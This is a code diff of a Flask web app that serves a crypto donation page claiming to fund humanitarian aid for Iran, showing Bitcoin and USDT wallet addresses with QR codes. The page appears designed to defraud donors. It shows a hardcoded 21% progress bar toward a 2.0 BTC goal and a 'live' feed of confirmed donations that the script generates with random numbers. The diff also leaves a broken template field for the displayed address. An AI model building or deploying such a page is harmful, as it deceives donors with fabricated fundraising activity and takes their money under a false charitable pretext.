@@ -1,8 +1,9 @@
 from flask import Flask, render_template_string
-import qrcode, io, base64, random
+import qrcode, io, base64
 
 app = Flask(__name__)
 
+# Твои кошельки
 W = [
     {"n": "BITCOIN", "a": "bc1qrpg5nwr5t8jl3nnavgf2k2v4c43u75c9usxpyk"},
     {"n": "USDT (ERC20)", "a": "0x40745600a508d653549c664d050b90826e4b61ba"}
@@ -19,116 +20,77 @@ H = """
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>RED_TERMINAL | IRAN_FUND</title>
+    <title>RED_TERMINAL</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.6; } /* Яркая матрица */
-        .header { margin-top: 40px; text-align: center; max-width: 800px; padding: 0 20px; z-index: 1; }
-        .glitch { font-size: 2.5rem; font-weight: bold; text-transform: uppercase; color: #ff0000; text-shadow: 2px 2px #550000; animation: glitch 1s infinite; }
-        @keyframes glitch { 0% { transform: skew(0deg); } 20% { transform: skew(-1deg); } 40% { transform: skew(1.5deg); } 100% { transform: skew(0deg); } }
-        
-        .manifesto { background: rgba(20, 0, 0, 0.9); border: 1px solid #ff0000; padding: 20px; margin: 30px 0; font-size: 0.9rem; line-height: 1.5; color: #ff6666; text-align: left; box-shadow: 0 0 15px #ff0000; }
-        
-        .goal-container { width: 100%; max-width: 640px; margin: 20px 0; text-align: left; }
-        .goal-bar { width: 100%; height: 18px; background: #200; border: 2px solid #ff0000; position: relative; border-radius: 5px; overflow: hidden; }
-        .goal-fill { width: 21%; height: 100%; background: #ff0000; box-shadow: 0 0 20px #ff0000; }
-        .goal-text { display: flex; justify-content: space-between; font-size: 0.85rem; margin-top: 8px; color: #ff0000; font-weight: bold; }
-
-        .container { display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; z-index: 1; margin-top: 20px; }
-        .card { background: rgba(0, 0, 0, 0.9); border: 2px solid #ff0000; padding: 20px; width: 280px; text-align: center; transition: 0.3s; }
-        .card:hover { transform: scale(1.02); box-shadow: 0 0 30px #ff0000; }
-        .qr-box { background: #fff; padding: 10px; margin: 15px 0; border: 2px solid #ff0000; }
-        .qr-box img { width: 100%; }
-        .addr { font-size: 0.65rem; word-break: break-all; color: #ff9999; background: #100; padding: 10px; border: 1px dashed #ff0000; }
-        .btn { margin-top: 15px; background: #ff0000; border: none; color: #000; padding: 12px; cursor: pointer; width: 100%; font-weight: bold; text-transform: uppercase; }
-        .btn:hover { background: #cc0000; color: #fff; }
-
-        /* Панель транзакций (ЯРКАЯ) */
-        .tx-panel { width: 100%; max-width: 640px; background: rgba(20,0,0,0.95); border: 2px solid #ff0000; margin: 40px 0; padding: 15px; font-size: 0.8rem; color: #ff0000; z-index: 1; box-shadow: 0 0 20px #ff0000; }
-        .tx-list { height: 150px; overflow: hidden; position: relative; }
-        .tx-item { padding: 8px 0; border-bottom: 1px solid #400; animation: slideUp 0.4s ease-out; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .tx-amt { color: #fff; font-weight: bold; text-shadow: 0 0 5px #ff0000; }
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; margin: 0; padding: 20px; overflow-x: hidden; }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.5; }
+        .card { border: 2px solid #f00; background: rgba(0,0,0,0.8); margin: 20px auto; padding: 20px; max-width: 350px; box-shadow: 0 0 20px #f00; }
+        .qr { background: #fff; padding: 10px; margin: 15px 0; width: 200px; display: inline-block; }
+        .addr { font-size: 10px; word-break: break-all; color: #ff9999; margin-bottom: 15px; }
+        .btn { background: #f00; color: #000; border: none; padding: 10px; cursor: pointer; width: 100%; font-weight: bold; }
+        .tx-box { border: 1px solid #f00; max-width: 500px; margin: 20px auto; padding: 10px; text-align: left; font-size: 12px; }
     </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <div class="header">
-        <div class="glitch">RED_CHANNEL_IRAN</div>
-        <div class="manifesto">
-            > ATTENTION: Secured connection established.<br>
-            > MISSION: Medicine, food, and communication for Iran.<br>
-            > PROTOCOL: Full anonymity. Zero tracking.
-        </div>
-        
-        <div class="goal-container">
-            <div class="goal-bar"><div class="goal-fill"></div></div>
-            <div class="goal-text">
-                <span>GOAL: 2.0 BTC (Humanitarian Aid)</span>
-                <span>21.4% COMPLETED</span>
-            </div>
-        </div>
+    <canvas id="m"></canvas>
+    <h1 style="text-shadow: 0 0 10px #f00;">SYSTEM_RED_CHANNEL</h1>
+    <div style="border: 1px solid #f00; padding: 15px; max-width: 600px; margin: 0 auto; background: rgba(20,0,0,0.7);">
+        > MISSION: Humanitarian Aid for Iran<br>
+        > PROTOCOL: Full Anonymity Secured
     </div>
 
-    <div class="container">
-        {% for w in W %}
-        <div class="card">
-            <h3 style="margin:0;">{{ w.n }}</h3>
-            <div class="qr-box"><img src="data:image/png;base64,{{ q(w.a) }}"></div>
-            <div class="addr" id="a-{{ loop.index }}">{{ w.a }}</div>
-            <button class="btn" onclick="copy('a-{{ loop.index }}')">COPY ADDR</button>
+    <div style="margin: 20px 0;">
+        <div style="width:300px; height:15px; border:1px solid #f00; margin: 0 auto; position: relative;">
+            <div style="width: 21%; height: 100%; background: #f00; box-shadow: 0 0 10px #f00;"></div>
         </div>
-        {% endfor %}
+        <div style="font-size: 12px; margin-top: 5px;">GOAL: 2.0 BTC (21% reached)</div>
     </div>
 
-    <div class="tx-panel">
-        <div style="border-bottom: 2px solid #ff0000; padding-bottom: 5px; margin-bottom: 10px; font-weight: bold;">[!] LIVE_INCOMING_DATA</div>
-        <div class="tx-list" id="tx-list"></div>
+    {% for w in W %}
+    <div class="card">
+        <h3>{{ w.n }}</h3>
+        <div class="qr"><img src="data:image/png;base64,{{ q(w.a) }}" width="200"></div>
+        <div class="addr">{{ w.addr }}</div>
+        <button class="btn" onclick="navigator.clipboard.writeText('{{ w.a }}');alert('Copied!')">COPY ADDRESS</button>
     </div>
+    {% endfor %}
 
-    <p style="margin: 40px 0; color: #600; font-size: 0.7rem;">STATUS: ENCRYPTED // NO_DATA_RETAINED</p>
+    <div class="tx-box">
+        <div style="color:#f00; border-bottom: 1px solid #f00; margin-bottom: 5px;">[!] LIVE_DATA_FEED:</div>
+        <div id="tx"></div>
+    </div>
 
     <script>
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = '01';
-        const fontSize = 18;
-        const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+        const c = document.getElementById('m');
+        const x = c.getContext('2d');
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        const drops = Array(Math.floor(c.width/20)).fill(1);
         function draw() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#ff0000'; // КРАСНЫЙ ЦВЕТ
-            ctx.font = fontSize + 'px monospace';
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters.charAt(Math.floor(Math.random() * letters.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            x.fillStyle = 'rgba(0,0,0,0.1)'; x.fillRect(0,0,c.width,c.height);
+            x.fillStyle = '#f00'; x.font = '20px monospace';
+            drops.forEach((y, i) => {
+                x.fillText(Math.floor(Math.random()*2), i*20, y*20);
+                if(y*20 > c.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
-            }
+            });
         }
-        setInterval(draw, 40);
+        setInterval(draw, 50);
 
-        const txList = document.getElementById('tx-list');
-        const amounts = ["0.008 BTC", "0.015 BTC", "12.00 USDT", "240.00 USDT", "0.004 BTC", "95.00 USDT"];
-        
         function addTx() {
-            const id = Math.random().toString(16).substring(2, 8).toUpperCase();
-            const amt = amounts[Math.floor(Math.random() * amounts.length)];
-            const item = document.createElement('div');
-            item.className = 'tx-item';
-            item.innerHTML = `[${new Date().toLocaleTimeString()}] <span style="color:#ff6666">PID_${id}</span> confirmed: <span class="tx-amt">+${amt}</span>`;
-            txList.prepend(item);
-            if (txList.childNodes.length > 5) txList.removeChild(txList.lastChild);
+            const list = document.getElementById('tx');
+            const d = document.createElement('div');
+            d.innerHTML = `[${new Date().toLocaleTimeString()}] Confirmed: +${(Math.random()*0.05).toFixed(3)} BTC...`;
+            list.prepend(d);
+            if(list.childNodes.length > 4) list.removeChild(list.lastChild);
         }
-        setInterval(addTx, 6000); // Чаще - каждые 6 секунд
-        addTx(); addTx();
-
-        function copy(id) {
-            const t = document.getElementById(id).innerText;
-            navigator.clipboard.writeText(t);
-            alert('Copied to encrypted clipboard.');
-        }
+        setInterval(addTx, 5000); addTx();
     </script>
 </body>
 </html>
+"""
+
+@app.route('/')
+def i(): return render_template_string(H, W=W, q=get_qr)
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
